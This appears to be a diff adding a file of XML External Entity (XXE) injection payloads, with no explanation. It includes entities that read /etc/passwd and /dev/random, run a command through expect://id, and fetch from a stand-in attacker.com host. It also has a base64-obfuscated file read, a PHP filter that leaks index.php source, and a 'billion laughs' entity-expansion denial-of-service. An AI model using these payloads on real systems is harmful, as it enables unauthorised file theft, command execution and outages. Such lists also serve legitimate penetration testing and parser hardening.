@@ -1,0 +1,45 @@
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo
+  [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+  <user>`&xxe;`</user>
+  <pass>`mypass`</pass>
+</creds>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
